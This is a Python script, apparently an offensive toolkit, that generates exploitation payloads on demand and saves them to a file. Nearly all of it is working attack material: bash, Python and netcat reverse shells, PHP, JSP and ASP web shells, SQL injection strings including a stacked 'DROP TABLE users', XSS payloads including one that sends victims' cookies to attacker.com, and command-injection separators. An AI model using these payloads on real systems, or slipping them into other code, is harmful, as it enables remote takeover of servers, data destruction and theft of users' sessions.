#!/usr/bin/env python3
"""
Payload Generator
Generates various types of payloads for exploitation.
"""

import base64
import struct
from typing import List, Dict

class PayloadGenerator:
    def __init__(self):
        self.payloads = {}
    
    def generate_reverse_shell(self, host: str, port: int, shell_type: str = 'bash') -> str:
        """Generate reverse shell payload"""
        if shell_type == 'bash':
            payload = f"bash -i >& /dev/tcp/{host}/{port} 0>&1"
        elif shell_type == 'python':
            payload = f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
        elif shell_type == 'nc':
            payload = f"nc -e /bin/sh {host} {port}"
        else:
            payload = f"bash -i >& /dev/tcp/{host}/{port} 0>&1"
        
        return payload
    
    def generate_web_shell(self, shell_type: str = 'php') -> str:
        """Generate web shell payload"""
        if shell_type == 'php':
            payload = """<?php system($_GET['cmd']); ?>"""
        elif shell_type == 'jsp':
            payload = """<%@ page import="java.util.*,java.io.*"%><% if (request.getParameter("cmd") != null) { Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); DataInputStream dis = new DataInputStream(p.getInputStream()); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); } } %>"""
        elif shell_type == 'asp':
            payload = """<%eval request("cmd")%>"""
        else:
            payload = """<?php system($_GET['cmd']); ?>"""
        
        return payload
    
    def generate_sql_payload(self, payload_type: str = 'union') -> str:
        """Generate SQL injection payload"""
        payloads = {
            'union': "1' UNION SELECT NULL,NULL--",
            'error': "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            'blind': "1' AND 1=1--",
            'time': "1' AND SLEEP(5)--",
            'stacked': "1'; DROP TABLE users--"
        }
        return payloads.get(payload_type, payloads['union'])
    
    def generate_xss_payload(self, payload_type: str = 'alert') -> str:
        """Generate XSS payload"""
        payloads = {
            'alert': "<script>alert('XSS')</script>",
            'img': "<img src=x onerror=alert('XSS')>",
            'svg': "<svg onload=alert('XSS')>",
            'body': "<body onload=alert('XSS')>",
            'cookie': "<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>"
        }
        return payloads.get(payload_type, payloads['alert'])
    
    def generate_command_injection(self, command: str = 'id') -> str:
        """Generate command injection payload"""
        payloads = [
            f"; {command}",
            f"| {command}",
            f"&& {command}",
            f"|| {command}",
            f"`{command}`",
            f"$({command})",
            f"; {command} #",
            f"| {command} #"
        ]
        return payloads
    
    def encode_payload(self, payload: str, encoding: str = 'base64') -> str:
        """Encode payload"""
        if encoding == 'base64':
            return base64.b64encode(payload.encode()).decode()
        elif encoding == 'url':
            import urllib.parse
            return urllib.parse.quote(payload)
        elif encoding == 'hex':
            return payload.encode().hex()
        return payload
    
    def generate_all_payloads(self, target_host: str = '192.168.1.100', 
                              target_port: int = 4444) -> Dict:
        """Generate all common payload types"""
        return {
            'reverse_shell_bash': self.generate_reverse_shell(target_host, target_port, 'bash'),
            'reverse_shell_python': self.generate_reverse_shell(target_host, target_port, 'python'),
            'web_shell_php': self.generate_web_shell('php'),
            'web_shell_jsp': self.generate_web_shell('jsp'),
            'sql_union': self.generate_sql_payload('union'),
            'sql_error': self.generate_sql_payload('error'),
            'sql_blind': self.generate_sql_payload('blind'),
            'sql_time': self.generate_sql_payload('time'),
            'xss_alert': self.generate_xss_payload('alert'),
            'xss_cookie': self.generate_xss_payload('cookie'),
            'command_injection': self.generate_command_injection('id')
        }
    
    def save_payloads(self, filename: str = 'payloads.txt'):
        """Save all payloads to file"""
        payloads = self.generate_all_payloads()
        
        with open(filename, 'w') as f:
            f.write("# Generated Payloads\n\n")
            for name, payload in payloads.items():
                f.write(f"## {name}\n")
                if isinstance(payload, list):
                    for p in payload:
                        f.write(f"{p}\n")
                else:
                    f.write(f"{payload}\n")
                f.write("\n")
        
        print(f"[+] Payloads saved to {filename}")

def main():
    import sys
    
    generator = PayloadGenerator()
    
    if len(sys.argv) > 1:
        payload_type = sys.argv[1]
        
        if payload_type == 'reverse':
            host = sys.argv[2] if len(sys.argv) > 2 else '192.168.1.100'
            port = int(sys.argv[3]) if len(sys.argv) > 3 else 4444
            print(generator.generate_reverse_shell(host, port))
        elif payload_type == 'webshell':
            shell_type = sys.argv[2] if len(sys.argv) > 2 else 'php'
            print(generator.generate_web_shell(shell_type))
        elif payload_type == 'sql':
            sql_type = sys.argv[2] if len(sys.argv) > 2 else 'union'
            print(generator.generate_sql_payload(sql_type))
        elif payload_type == 'xss':
            xss_type = sys.argv[2] if len(sys.argv) > 2 else 'alert'
            print(generator.generate_xss_payload(xss_type))
        else:
            generator.save_payloads()
    else:
        generator.save_payloads()
        print("\n[+] Usage examples:")
        print("  python payload_generator.py reverse 192.168.1.100 4444")
        print("  python payload_generator.py webshell php")
        print("  python payload_generator.py sql union")
        print("  python payload_generator.py xss alert")

if __name__ == '__main__':
    main()

